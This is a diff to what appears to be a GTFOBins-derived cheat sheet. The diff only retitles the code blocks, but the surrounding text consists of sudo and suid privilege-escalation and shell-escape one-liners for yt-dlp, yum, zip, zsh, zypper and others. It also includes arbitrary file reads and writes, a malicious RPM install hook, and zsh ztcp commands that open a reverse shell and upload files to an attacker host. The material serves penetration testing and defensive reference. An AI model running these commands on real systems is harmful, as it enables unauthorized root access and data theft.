@@ -11199,7 +11399,7 @@ var file_in
 
 The URL must point to a valid YouTube video which will be actually downloaded.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins yt-dlp shell (sudo / unprivileged)"
 yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
 ```
 <!-- cheat
@@ -11211,7 +11411,7 @@ yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
 
 Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install .x.sh . ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins yum command (sudo)"
 yum localinstall -y x-1.0-1.noarch.rpm
 ```
 <!-- cheat
@@ -11221,7 +11421,7 @@ yum localinstall -y x-1.0-1.noarch.rpm
 
 The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.
 
-```sh title:"sudo"
+```sh title:"GTFOBins yum download (sudo)"
 yum install $scheme://$lhost$file_in.rpm
 ```
 <!-- cheat
@@ -11234,7 +11434,7 @@ var file_in
 
 This allows to run Python code (`...`).
 
-```sh title:"sudo"
+```sh title:"GTFOBins yum inherit (inherits from python) (sudo)"
 cat >$tmp_dir/x<<EOF
 [main]
 plugins=1
@@ -11269,7 +11469,7 @@ This requires a running X server.
 
 The interaction happens in a GUI window, while the shell is dropped in the terminal.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins zathura shell (sudo / unprivileged)"
 zathura
 :! /bin/sh -c 'exec /bin/sh 0<&1'
 ```
@@ -11282,7 +11482,7 @@ zathura
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins zcat file-read (sudo / unprivileged)"
 zcat -f $file_in
 ```
 <!-- cheat
@@ -11295,7 +11495,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins zgrep file-read (sudo / unprivileged)"
 grep '' $file_in
 ```
 <!-- cheat
@@ -11308,7 +11508,7 @@ var file_in
 
 This executes the command twice:  - `$cmd_file 0 xxx` - `$cmd_file 1 xxx`  Additionally the `Test` file is created.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zic command (sudo / suid / unprivileged)"
 echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >$tmp_file
 echo 'Zone Test 2:00 Jordan CE%sT' >>$tmp_file
 zic -d . -y $cmd_file $tmp_file
@@ -11324,7 +11524,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zip shell (sudo / suid / unprivileged)"
 zip $tmp_file /etc/hosts -T -TT '/bin/sh #'
 ```
 <!-- cheat
@@ -11335,7 +11535,7 @@ var tmp_file
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zip file-read (sudo / suid / unprivileged)"
 zip $tmp_file $file_in
 unzip -p $tmp_file
 ```
@@ -11350,7 +11550,7 @@ var tmp_file
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zless inherit (inherits from less) (sudo / suid / unprivileged)"
 zless $file_in
 ```
 <!-- cheat
@@ -11363,7 +11563,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh shell (sudo / suid / unprivileged)"
 zsh
 ```
 <!-- cheat
@@ -11373,7 +11573,7 @@ zsh
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh reverse-shell (sudo / suid / unprivileged)"
 zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
 ```
 <!-- cheat
@@ -11385,7 +11585,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh file-read #1 (sudo / suid / unprivileged)"
 zsh -c 'echo "$(<$file_in)"'
 ```
 <!-- cheat
@@ -11396,7 +11596,7 @@ var file_in
 
 This spawns a pager if run in a TTY.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh file-read #2 (sudo / suid / unprivileged)"
 zsh -c '<$file_in'
 ```
 <!-- cheat
@@ -11407,7 +11607,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh file-write (sudo / suid / unprivileged)"
 zsh -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -11419,7 +11619,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh download (sudo / suid / unprivileged)"
 zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;echo -n "$(<&$REPLY)" >$file_out'
 ```
 <!-- cheat
@@ -11432,7 +11632,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh upload (sudo / suid / unprivileged)"
 zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;echo -n "$(<$file_in)" >&$REPLY'
 ```
 <!-- cheat
@@ -11445,7 +11645,7 @@ var file_in
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsh inherit (inherits from less) (sudo / suid / unprivileged)"
 zsh -c '</etc/hosts'
 ```
 <!-- cheat
@@ -11457,7 +11657,7 @@ zsh -c '</etc/hosts'
 
 The content is actually parsed and corrupted by the command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins zsoelim file-read (sudo / suid / unprivileged)"
 zsoelim $file_in
 ```
 <!-- cheat
@@ -11470,7 +11670,7 @@ var file_in
 
 The copy usually requires elevated privileges.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins zypper shell #1 (sudo / unprivileged)"
 cp /bin/sh /usr/lib/zypper/commands/zypper-x
 zypper x
 ```
@@ -11481,7 +11681,7 @@ zypper x
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins zypper shell #2 (sudo / unprivileged)"
 cp /bin/sh $tmp_dir/zypper-x
 PATH=$PATH:$tmp_dir/ zypper x
 ```
